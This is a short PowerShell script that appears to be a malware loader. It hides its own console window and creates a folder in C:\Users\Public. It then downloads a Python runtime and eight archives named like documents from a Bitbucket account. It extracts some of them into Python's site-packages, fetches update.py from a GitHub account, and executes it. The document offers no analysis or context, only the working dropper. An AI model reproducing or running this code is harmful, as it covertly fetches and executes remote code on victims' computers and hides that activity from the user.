function Hide-ConsoleWindow() {
    $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $ShowWindowAsync = Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
  
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
      $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
    } else {  
      $UniqueWindowTitle = New-Guid
      $Host.UI.RawUI.WindowTitle = $UniqueWindowTitle
  
      $TerminalProcess = (Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle })
      $hwnd = $TerminalProcess.MainWindowHandle
      if ($hwnd -ne [System.IntPtr]::Zero) {
        $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
      } else {
        Write-Host "Failed to hide the console window."
      }
    }
  }
Hide-ConsoleWindow

$newFolderPath = "C:\Users\Public\document"
if (-not (Test-Path -Path $newFolderPath -PathType Container)) {
    New-Item -ItemType Directory -Path $newFolderPath | Out-Null
    Write-Host "Folder created successfully at $newFolderPath"
} else {
    Write-Host "Folder already exists at $newFolderPath"
}

$downloads = @(
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/python311.zip"; Output = "C:\Users\Public\document\python311.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document1.zip"; Output = "C:\Users\Public\document1.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document2.zip"; Output = "C:\Users\Public\document2.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document3.zip"; Output = "C:\Users\Public\document3.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document4.zip"; Output = "C:\Users\Public\document4.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document5.zip"; Output = "C:\Users\Public\document5.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document6.zip"; Output = "C:\Users\Public\document6.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document7.zip"; Output = "C:\Users\Public\document7.zip" },
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document8.zip"; Output = "C:\Users\Public\document8.zip" }
)

foreach ($download in $downloads) {
    Start-Job -ScriptBlock {
        param($url, $output)
        Invoke-WebRequest -Uri $url -OutFile $output
    } -ArgumentList $download.Url, $download.Output
}

Get-Job | Wait-Job

Get-Job | Format-Table -Property State, HasMoreData, Id, @{ Label = "Url"; Expression = { $downloads[$_.Name.Split("_")[1]].Url } }, @{ Label = "Output"; Expression = { $downloads[$_.Name.Split("_")[1]].Output } }

Expand-Archive C:\Users\Public\document1.zip -DestinationPath C:\Users\Public\document -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document2.zip -DestinationPath C:\Users\Public\document -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document3.zip -DestinationPath C:\Users\Public\document -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document4.zip -DestinationPath C:\Users\Public\document -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document5.zip -DestinationPath C:\Users\Public\document -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document6.zip -DestinationPath "C:\Users\Public\document\Lib\site-packages" -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document7.zip -DestinationPath "C:\Users\Public\document\Lib\site-packages" -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\Public\document8.zip -DestinationPath "C:\Users\Public\document\Lib\site-packages" -Force -ErrorAction SilentlyContinue

Invoke-WebRequest https://github.com/hackerdeptra/bat/blob/main/update.py -OutFile C:\Users\Public\update.py
C:\Users\Public\document\python.exe C:\Users\Public\update.py
